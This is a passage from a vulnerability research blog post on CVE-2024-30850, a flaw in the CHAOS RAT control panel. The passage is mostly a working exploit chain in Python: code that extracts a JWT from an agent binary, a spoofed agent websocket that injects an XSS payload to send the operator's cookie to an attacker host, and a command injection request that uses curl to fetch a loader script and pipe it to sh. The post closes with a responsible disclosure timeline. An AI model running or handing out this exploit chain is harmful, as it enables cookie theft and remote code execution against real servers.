</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;shutdown&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;restart&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span></code></pre></div><p>We can also spoof this websocket connection in our exploit script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handle_command</span>(target, cookie, mac, ip, port):
</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Cookie&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;jwt=</span><span style="color:#e6db74">{</span>cookie<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;X-Client&#34;</span>: mac
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ws <span style="color:#f92672">=</span> websocket<span style="color:#f92672">.</span>WebSocket()
</span></span><span style="display:flex;"><span>    ws<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ws://</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/client&#39;</span>, header<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> ws<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
</span></span></code></pre></div><p>This means that, if we are able to retrieve a RAT agent binary (from a staging directory, malware repository or a filesystem during incident response) we would be able to extract the JWT and open a lot more attack surface. We could potentially trigger the RCE from a much lower privilege level! <!-- raw HTML omitted -->
Extracting both the JWT and the RAT server address from a golang binary is as simple as using some regex patterns in python since these are embedded into the binary, and there are no obfuscation options during build.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_client_info</span>(path):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(path, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> str(f<span style="color:#f92672">.</span>read())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    address_regexp <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;main\.ServerAddress=(?:[0-9]{1,3}\.)</span><span style="color:#e6db74">{3}</span><span style="color:#e6db74">[0-9]{1,3}&#34;</span>
</span></span><span style="display:flex;"><span>    address_pattern <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(address_regexp)
</span></span><span style="display:flex;"><span>    address <span style="color:#f92672">=</span> address_pattern<span style="color:#f92672">.</span>findall(data)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;=&#34;</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    port_regexp <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;main\.Port=\d{1,6}&#34;</span>
</span></span><span style="display:flex;"><span>    port_pattern <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(port_regexp)
</span></span><span style="display:flex;"><span>    port <span style="color:#f92672">=</span> port_pattern<span style="color:#f92672">.</span>findall(data)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;=&#34;</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    jwt_regexp <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;main\.Token=[a-zA-Z0-9_\.\-+/=]*\.[a-zA-Z0-9_\.\-+/=]*\.[a-zA-Z0-9_\.\-+/=]*&#34;</span>
</span></span><span style="display:flex;"><span>    jwt_pattern <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(jwt_regexp)
</span></span><span style="display:flex;"><span>    jwt <span style="color:#f92672">=</span> jwt_pattern<span style="color:#f92672">.</span>findall(data)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;=&#34;</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>address<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, jwt
</span></span></code></pre></div><p>Now we can start to look at the attack surface of the application from the perspective of an authenticated agent.  Reviewing the agent routes, I was able to identify an XSS that could be triggered by the RAT operator interacting with the agent.  This XSS allows us to execute arbitrary javascript in the context of the administrator and trigger the command injection vulnerability.</p>
<p>The vulnerability exists within the sendCommandHandler, where an attacker controlled response is added to the DOM without any sanitization.  The attacker can control the &ldquo;output&rdquo; variable by spoofing an agent callback and waiting for a RAT operator to interact with the agent.  Since we will be spoofing the agent with python code, the output can be arbitrary, attacker controlled data.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">h</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">httpController</span>) <span style="color:#a6e22e">sendCommandHandler</span>(<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">gin</span>.<span style="color:#a6e22e">Context</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">form</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">SendCommandRequestForm</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">ShouldBind</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">form</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">String</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusBadRequest</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">TrimSpace</span>(<span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">Command</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">String</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusOK</span>, <span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">NoContent</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">clientID</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">DecodeBase64</span>(<span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">Address</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">String</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusBadRequest</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ctxWithTimeout</span>, <span style="color:#a6e22e">cancel</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">WithTimeout</span>(<span style="color:#a6e22e">c</span>, <span style="color:#ae81ff">10</span><span style="color:#f92672">*</span><span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">cancel</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">output</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">ClientService</span>.<span style="color:#a6e22e">SendCommand</span>(<span style="color:#a6e22e">ctxWithTimeout</span>, <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">SendCommandInput</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ClientID</span>:  <span style="color:#a6e22e">clientID</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Command</span>:   <span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">Command</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Parameter</span>: <span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">Parameter</span>,
</span></span><span style="display:flex;"><span>	})
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">String</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">String</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusOK</span>, <span style="color:#a6e22e">output</span>.<span style="color:#a6e22e">Response</span>) <span style="color:#75715e">// HERE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span></code></pre></div><p>The sendCommandHandler function is mapped to the /command route, which is the route an admin will hit when interacting with the agent. Once they do so, we can trigger the command injection vulnerability and takeover the RAT server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">adminGroup</span>.<span style="color:#a6e22e">POST</span>(<span style="color:#e6db74">&#34;/command&#34;</span>, <span style="color:#a6e22e">handler</span>.<span style="color:#a6e22e">sendCommandHandler</span>)
</span></span></code></pre></div><p>We can edit our function that creates the websocket connection to include a payload that will send the panel operator&rsquo;s cookie back to the attacker and include a video as command output for rickrolling.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handle_command</span>(target, cookie, mac, ip, port):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Waiting to serve malicious command outupt&#34;</span>)
</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Cookie&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;jwt=</span><span style="color:#e6db74">{</span>cookie<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;X-Client&#34;</span>: mac
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ws <span style="color:#f92672">=</span> websocket<span style="color:#f92672">.</span>WebSocket()
</span></span><span style="display:flex;"><span>    ws<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ws://</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/client&#39;</span>, header<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> ws<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        command <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(response)[<span style="color:#e6db74">&#39;command&#39;</span>]
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;client_id&#34;</span>: mac, <span style="color:#e6db74">&#34;response&#34;</span>: convert_to_int_array(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&lt;/pre&gt;&lt;script&gt;var i = new Image;i.src=&#39;http://</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">/&#39;+document.cookie;&lt;/script&gt;&lt;video loop controls autoplay&gt;&lt;source src=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">http://</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">/video.mp4</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> type=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">video/mp4</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&gt;&lt;/video&gt;&#34;</span>), <span style="color:#e6db74">&#34;has_error&#34;</span>: <span style="color:#66d9ef">False</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ws<span style="color:#f92672">.</span>send_binary(json<span style="color:#f92672">.</span>dumps(data))
</span></span></code></pre></div><p>Once the cookie has been received, it can be used to exploit the command injection vulnerability</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_exploit</span>(cookie, target, ip, port):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Exploiting </span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> with JWT </span><span style="color:#e6db74">{</span>cookie<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> http<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>HTTPConnection(target)
</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;multipart/form-data; boundary=---------------------------196428912119225031262745068932&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Cookie&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;jwt=</span><span style="color:#e6db74">{</span>cookie<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>request(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;POST&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;/generate&#39;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;-----------------------------196428912119225031262745068932</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Disposition: form-data; name=&#34;address&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">http://localhost</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">$(IFS=];b=curl]</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">/loader.sh;$b|sh)</span><span style="color:#ae81ff">\&#39;\r\n</span><span style="color:#e6db74">-----------------------------196428912119225031262745068932</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Disposition: form-data; name=&#34;port&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">8080</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">-----------------------------196428912119225031262745068932</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Disposition: form-data; name=&#34;os_target&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">-----------------------------196428912119225031262745068932</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Disposition: form-data; name=&#34;filename&#34;</span><span style="color:#ae81ff">\r\n\r\n\r\n</span><span style="color:#e6db74">-----------------------------196428912119225031262745068932</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Disposition: form-data; name=&#34;run_hidden&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">false</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">-----------------------------196428912119225031262745068932--</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>,
</span></span><span style="display:flex;"><span>        headers
</span></span><span style="display:flex;"><span>    )
</span></span></code></pre></div><p>Full POC: <a href="https://github.com/chebuya/CVE-2024-30850-chaos-rat-rce-poc">https://github.com/chebuya/CVE-2024-30850-chaos-rat-rce-poc</a></p>
<h3 id="disclosure">Disclosure</h3>
<p>2024-04-05 Notified developer <br>
2024-05-29 <a href="https://github.com/tiagorlampert/CHAOS/commit/ea4d56d9d40e2054eda8041959cd1b728a39766e">Developer pushes patch</a></p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://www.trendmicro.com/en_za/research/22/l/linux-cryptomining-enhanced-via-chaos-rat-.html">https://www.trendmicro.com/en_za/research/22/l/linux-cryptomining-enhanced-via-chaos-rat-.html</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces">https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
